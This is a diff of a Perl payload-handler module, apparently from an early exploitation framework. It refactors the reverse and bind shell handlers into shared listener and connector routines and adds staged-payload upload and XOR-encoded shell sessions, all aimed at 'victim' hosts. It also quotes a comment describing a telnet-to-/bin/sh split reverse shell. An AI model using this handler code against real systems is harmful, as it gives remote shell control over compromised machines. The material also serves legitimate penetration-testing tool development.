@@ -26,51 +26,25 @@ use strict;
 sub ConsoleStart
 {
     my $self = shift;
-    
+   
     my $con;
     my $stdpipe = 0;
-
-    if($^O eq "MSWin32")
-    {
-        # no such thing as nonblock/select on non-sockets under win32 :(
-	    socketpair($con, my $wri, AF_UNIX, SOCK_STREAM, PF_UNSPEC) || die "socketpair: $!";
-	    shutdown($con, 1);
-	    shutdown($wri, 0);
-
-	    $stdpipe = fork();
-	    if (! $stdpipe)
-	    {
-                my $input;
-                while(sysread(STDIN, $input, 1)){ syswrite($wri, $input, length($input)); }
-                exit(0);
-	    }
-        $self->{"CONSOLE"} = {"FD" => [$con, $wri], "PID" => $stdpipe};
-    } else {
-        $con = *STDIN;
-        $self->{"CONSOLE"} = {"FD" => [$con]};
-    }
+    $con = *STDIN;
+    $self->{"CONSOLE"} = {"FD" => [$con]};
     return $con;
 }
 
 sub ConsoleStop
 {
     my $self = shift;
-    
-    # shutdown the win32 console pump
-    if ($^O eq "MSWin32")
-    {
-        foreach my $fd (@{$self->{"CONSOLE"}->{"FD"}}) { $fd->close(); }
-        kill(9, $self->{"CONSOLE"}->{"PID"}) if defined($self->{"CONSOLE"}->{"PID"});
-    }
+    return;
 }
 
-sub reverse_shell
-{
-    my ($self, $exploit) = @_;
-    
+sub Listener {
+    my ($self, $proc, $port) = @_;
     my $s = IO::Socket::INET->new (
                 Proto => "tcp",
-                LocalPort => $self->GetVar('LPORT'),
+                LocalPort => $port,
                 Type => SOCK_STREAM,
                 ReuseAddr => 1,
                 Listen => 3
@@ -82,10 +56,10 @@ sub reverse_shell
         return undef;
     }
 
-    # put server into non-blocking mode
     Pex::Unblock($s);
 
     my $stopserver = 0;
+    my $victim;
     
     my %OSIG;
     $OSIG{"TERM"} = $SIG{"TERM"};
@@ -95,56 +69,31 @@ sub reverse_shell
     $SIG{"INT"}  = sub { $stopserver++ };
 
     my $sel = IO::Select->new($s);
-
+    
     while (! $stopserver)
     {
         my @X = $sel->can_read(0.5);
         if (scalar(@X))
         {
             $stopserver++;
-
-            my $victim = $s->accept();
+            $victim = $s->accept();
             
-            # terminate the exploit process
-            kill(9, $exploit);
-
-            print STDERR "[*] Connection from " . $victim->peerhost() . ":" . $victim->peerport() . "...\n\n";
-
-            my $console = $self->ConsoleStart();
-            my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
-            $callback->("CONNECT", $victim);
-
-            $self->DataPump($console, $victim, $callback);
-
-            $self->ConsoleStop($console);
-            $callback->("DISCONNECT", $victim);
-            $victim->close();
-            undef($victim);
-
         }
-        # work around a massive array of win32 signaling bugs
-        if (waitpid($exploit, WNOHANG) != 0) { $stopserver++ }
+        if (waitpid($proc, WNOHANG) != 0) { $stopserver++ }
     }
 
-    # make sure the exploit child process is dead
-    if (kill(0, $exploit)) { kill("TERM", $exploit) }
-
-    # clean up the listening socket
+    kill("KILL", $proc);
     $s->shutdown(2);
     $s->close();
     undef($s);
 
     $SIG{"TERM"} = $OSIG{"TERM"};
-    $SIG{"INT"}  = $OSIG{"INT"};
-
-    # return back to the calling module
-    print STDERR "[*] Exiting Shell Listener...\n";
-    return(1);
+    $SIG{"INT"}  = $OSIG{"INT"}; 
+    return $victim;
 }
 
-sub bind_shell
-{
-    my ($self, $exploit) = @_;
+sub Connector {
+    my ($self, $proc, $host, $port) = @_;
     my $stopconnect = 0;
     my $victim;
 
@@ -159,8 +108,8 @@ sub bind_shell
     {
        $victim = IO::Socket::INET->new (
                     Proto => "tcp",
-                    PeerAddr => $self->GetVar('RHOST'),
-                    PeerPort => $self->GetVar('LPORT'),
+                    PeerAddr => $host,
+                    PeerPort => $port,
                     Type => SOCK_STREAM,
        );
 
@@ -173,16 +122,7 @@ sub bind_shell
                 if ($stopconnect == 0 && $victim->connected())
                 {
                     $stopconnect++;
-                    kill(9, $exploit);
-
-                    print STDERR "[*] Connected to " . $victim->peerhost() . ":" . $victim->peerport() . "...\n\n";
-
-                    my $console = $self->ConsoleStart();
-                    my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
-                    $callback->("CONNECT", $victim);
-                    $self->DataPump($console, $victim, $callback);
-                    $self->ConsoleStop($console);
-                    $callback->("DISCONNECT", $victim);
+                    last;
                 } else {
                     select(undef, undef, undef, 0.5);
                 }
@@ -190,19 +130,61 @@ sub bind_shell
         } else {
             select(undef, undef, undef, 1);
         }
-        # work around a massive array of win32 signaling bugs
-        if (waitpid($exploit, WNOHANG) != 0) { $stopconnect++ }
+        if (waitpid($proc, WNOHANG) != 0) { $stopconnect++ }
     }
 
-    # make sure the exploit child process is dead
-    if (kill(0, $exploit)) { kill(9, $exploit) }
+    kill('KILL', $proc);
 
     # restore the signal handlers
     $SIG{"TERM"} = $OSIG{"TERM"};
     $SIG{"INT"}  = $OSIG{"INT"};
     
-    # return back to the calling module
-    print STDERR "[*] Exiting Shell Connector...\n";
+    return $victim if $victim && $victim->connected();
+    return;
+}
+
+sub reverse_shell
+{
+    my ($self, $exploit) = @_;
+    my $port = $self->GetVar('LPORT');
+    my $victim = $self->Listener($exploit, $port);
+    return(0) if ! $victim;
+    
+    print STDERR "[*] Connection from " . $victim->peerhost() . ":" . $victim->peerport() . "...\n\n";
+
+    
+    my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
+    
+    my $console = $self->ConsoleStart();
+    $callback->("CONNECT", $victim);
+    $self->DataPump($console, $victim, $callback);
+    $self->ConsoleStop($console);
+    $callback->("DISCONNECT", $victim);
+    
+    $victim->close();
+    undef($victim);
+    return(1);
+}
+
+sub bind_shell
+{
+    my ($self, $exploit) = @_;
+    my $host = $self->GetVar('RHOST');
+    my $port = $self->GetVar('LPORT');
+    my $victim = $self->Connector($exploit, $host, $port);    
+    return if ! $victim;
+
+    print STDERR "[*] Connected to " . $victim->peerhost() . ":" . $victim->peerport() . "...\n\n";
+
+    my $console = $self->ConsoleStart();
+    my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
+    $callback->("CONNECT", $victim);
+    $self->DataPump($console, $victim, $callback);
+    $self->ConsoleStop($console);
+    $callback->("DISCONNECT", $victim);
+    $victim->shutdown(2);
+    $victim->close();
+    undef($victim);
     return(1);
 }
 
@@ -210,98 +192,132 @@ sub bind_shell
 sub impurity_reverse
 {
     my ($self, $exploit) = @_;
-
-    my $s = IO::Socket::INET->new (
-                Proto => "tcp",
-                LocalPort => $self->GetVar('LPORT'),
-                Type => SOCK_STREAM,
-                ReuseAddr => 1,
-                Listen => 3
-    );
-
-    if (! $s)
+    my $port = $self->GetVar('LPORT');
+    my $victim = $self->Listener($exploit, $port);
+    return(0) if ! $victim;
+    
+    print STDERR "[*] Connection from " . $victim->peerhost() . ":" . $victim->peerport() . "...\n\n";
+   
+    local *X;
+    if(! open(X, "<".$self->GetVar('PEXEC')))
     {
-        $self->set_error("could not start listener: $!");
-        return undef;
+        print STDERR "ERROR\n";
+        print "[*] Could not open payload executable file: $!\n";
+        kill(9, $exploit);
+        return;
     }
 
-    # put server into non-blocking mode
-    Pex::Unblock($s);
+    binmode(X);
+    my $bindata;
+    while (<X>) { $bindata .= $_ }
+    close (X);
 
-    my %OSIG;
-    $OSIG{"TERM"} = $SIG{"TERM"};
-    $OSIG{"INT"}  = $SIG{"INT"};
-    
-    my $stopserver = 0;
-    $SIG{"TERM"} = sub { $stopserver++ };
-    $SIG{"INT"}  = sub { $stopserver++ };
-
-    my $sel = IO::Select->new($s);
-
-    while (! $stopserver)
+    print STDERR "[*] Uploading " . length($bindata) . " bytes...";
+    # Verify that all data is written... 
+    my $bsize = length($bindata);
+    my $bres = 0;
+    while ($bres < $bsize)
     {
-        my @X = $sel->can_read(0.5);
-        if (scalar(@X))
-        {
-            $stopserver++;
+         my $res = $victim->send($bindata);
+         if ($res <= 0)
+         {
+            print STDERR " Error ($res)\n";
+            return;
+         }
 
-            my $victim = $s->accept();
-            kill(9, $exploit);
-
-            print STDERR "[*] Connection from " . $victim->peerhost() . ":" . $victim->peerport() . "...\n";
-           
-            if(! open(X, "<".$self->GetVar('PEXEC')))
-            {
-                print STDERR "ERROR\n";
-                print "[*] Could not open payload executable file: $!\n";
-                kill(9, $exploit);
-                return;
-            }
-
-            binmode(X);
-            my $bindata;
-            while (<X>) { $bindata .= $_ }
-            close (X);
-            
-            print STDERR "[*] Uploading " . length($bindata) . " bytes...";
-            # Verify that all data is written... 
-            my $bsize = length($bindata);
-            my $bres = 0;
-            while ($bres < $bsize)
-            {
-                 my $res = $victim->send($bindata);
-                 if ($res <= 0)
-                 {
-                    print STDERR " Error ($res)\n";
-                    return;
-                 }
-                 
-                 $bres += $res;
-                 $bindata = substr($bindata, $res);
-            }
-            print STDERR " Done\n";
-            print STDERR "[*] Switching to impurity payload\n\n";
-
-            my $console = $self->ConsoleStart();
-            my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
-            $callback->("CONNECT", $victim);
-            $self->DataPump($console, $victim, $callback);
-            $self->ConsoleStop($console);
-            $callback->("DISCONNECT", $victim);
-        }
-        # work around a massive array of win32 signaling bugs
-        if (waitpid($exploit, WNOHANG) != 0) { $stopserver++ }
+         $bres += $res;
+         $bindata = substr($bindata, $res);
     }
+    print STDERR " Done\n";
+    print STDERR "[*] Switching to impurity payload\n\n";
 
-    # make sure the exploit child process is dead
-    if (kill(0, $exploit)) { kill(9, $exploit) }
-
-    # restore the signal handlers
-    $SIG{"TERM"} = $OSIG{"TERM"};
-    $SIG{"INT"}  = $OSIG{"INT"};
+    my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
     
-    # return back to the calling module
-    print STDERR "[*] Exiting Shell Listener...\n";
+    my $console = $self->ConsoleStart();
+    $callback->("CONNECT", $victim);
+    $self->DataPump($console, $victim, $callback);
+    $self->ConsoleStop($console);
+    $callback->("DISCONNECT", $victim);
+    
+    $victim->close();
+    undef($victim);
+    return(1);    
+}
+
+# Two-stage reverse connect shells
+sub reverse_shell_staged
+{
+    my ($self, $exploit) = @_;
+    my $port = $self->GetVar('LPORT');
+    my $victim = $self->Listener($exploit,$port);
+    return(0) if ! $victim;
+    
+    print STDERR "[*] Connection from " . $victim->peerhost() . ":" . $victim->peerport() . "...\n\n";
+       
+    print STDERR "[*] Uploading second stage...\n";
+    my $stage = $self->GetVar('_Payload')->NextStage();
+    $victim->send($stage);
+    
+    my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
+    
+    my $console = $self->ConsoleStart();
+    $callback->("CONNECT", $victim);
+    $self->DataPump($console, $victim, $callback);
+    $self->ConsoleStop($console);
+    $callback->("DISCONNECT", $victim);
+    
+    $victim->close();
+    undef($victim);
+    return(1);
+}
+
+
+# Two-stage bind shells
+sub bind_shell_staged
+{
+     my ($self, $exploit) = @_;
+    my $host = $self->GetVar('RHOST');
+    my $port = $self->GetVar('LPORT');
+    my $victim = $self->Connector($exploit, $host, $port);    
+    return if ! $victim;
+
+    print STDERR "[*] Connected to " . $victim->peerhost() . ":" . $victim->peerport() . "...\n\n";
+    
+    print STDERR "[*] Uploading second stage...\n";
+    my $stage = $self->GetVar('_Payload')->NextStage();
+    $victim->send($stage);
+
+    my $console = $self->ConsoleStart();
+    my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
+    $callback->("CONNECT", $victim);
+    $self->DataPump($console, $victim, $callback);
+    $self->ConsoleStop($console);
+    $callback->("DISCONNECT", $victim);
+    $victim->shutdown(2);
+    $victim->close();
+    undef($victim);
+    return(1);
+}
+
+sub reverse_shell_xor
+{
+    my ($self, $exploit) = @_;
+    my $port = $self->GetVar('LPORT');
+    my $victim = $self->Listener($exploit, $port);
+    return(0) if ! $victim;
+    
+    print STDERR "[*] Connection from " . $victim->peerhost() . ":" . $victim->peerport() . "...\n\n";
+
+    my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
+    
+    my $console = $self->ConsoleStart();
+    $callback->("CONNECT", $victim);
+    $self->DataPumpXor($console, $victim, $callback, $self->GetVar('XKEY'));
+    $self->ConsoleStop($console);
+    $callback->("DISCONNECT", $victim);
+    
+    $victim->close();
+    undef($victim);
     return(1);
 }
 
@@ -348,15 +364,10 @@ sub findsock_shell
             $self->ConsoleStop($console);
             $callback->("DISCONNECT", $s);
         }
-        # work around a massive array of win32 signaling bugs
         if (waitpid($exploit, WNOHANG) != 0) { $stopserver++ }
     }
 
-
-    # make sure the exploit child process is dead
-    if (kill(0, $exploit)) { kill(9, $exploit) }
-
-    # return back to the calling module
+    kill('KILL', $exploit);
     print STDERR "[*] Exiting Findsocket Handler...\n";
     return(1);
 }
@@ -393,87 +404,6 @@ sub findsock_shell_exp
         exit(0);
     }
 }
-
-sub reverse_shell_xor
-{
-    my ($self, $exploit) = @_;
-    
-    my $s = IO::Socket::INET->new (
-                Proto => "tcp",
-                LocalPort => $self->GetVar('LPORT'),
-                Type => SOCK_STREAM,
-                ReuseAddr => 1,
-                Listen => 3
-    );
-
-    if (! $s)
-    {
-        $self->set_error("could not start listener: $!");
-        return undef;
-    }
-
-    # put server into non-blocking mode
-    Pex::Unblock($s);
-    
-    my $xor_key = $self->GetVar('XKEY');
-    my $stopserver = 0;
-    
-    my %OSIG;
-    $OSIG{"TERM"} = $SIG{"TERM"};
-    $OSIG{"INT"}  = $SIG{"INT"};
-    
-    $SIG{"TERM"} = sub { $stopserver++ };
-    $SIG{"INT"}  = sub { $stopserver++ };
-
-    my $sel = IO::Select->new($s);
-
-    while (! $stopserver)
-    {
-        my @X = $sel->can_read(0.5);
-        if (scalar(@X))
-        {
-            $stopserver++;
-
-            my $victim = $s->accept();
-            
-            # terminate the exploit process
-            kill(9, $exploit);
-            
-            $self->PrintLine("[*] Connection from " . $victim->peerhost() . ":" . $victim->peerport() . "...");
-            $self->PrintLine("");
-
-            my $console = $self->ConsoleStart();
-            my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
-            $callback->("CONNECT", $victim);
-
-            $self->DataPumpXor($console, $victim, $callback, $xor_key);
-
-            $self->ConsoleStop($console);
-            $callback->("DISCONNECT", $victim);
-            $victim->close();
-            undef($victim);
-
-        }
-        # work around a massive array of win32 signaling bugs
-        if (waitpid($exploit, WNOHANG) != 0) { $stopserver++ }
-    }
-
-    # make sure the exploit child process is dead
-    if (kill(0, $exploit)) { kill("TERM", $exploit) }
-
-    # clean up the listening socket
-    $s->shutdown(2);
-    $s->close();
-    undef($s);
-
-    $SIG{"TERM"} = $OSIG{"TERM"};
-    $SIG{"INT"}  = $OSIG{"INT"};
-
-    # return back to the calling module
-    print STDERR "[*] Exiting Shell Listener...\n";
-    return(1);
-}
-
 
 # Handles telnet host port1 | /bin/sh | telnet host port2
 sub reverse_shell_split
@@ -563,7 +493,6 @@ sub reverse_shell_split
             $connB->close();
             
         }
-        # work around a massive array of win32 signaling bugs
         if (waitpid($exploit, WNOHANG) != 0) { $stopserver++ }
     }
 
@@ -584,5 +513,6 @@ sub reverse_shell_split
     print STDERR "[*] Exiting Shell Listener...\n";
     return(1);
 }
+
 
 1;
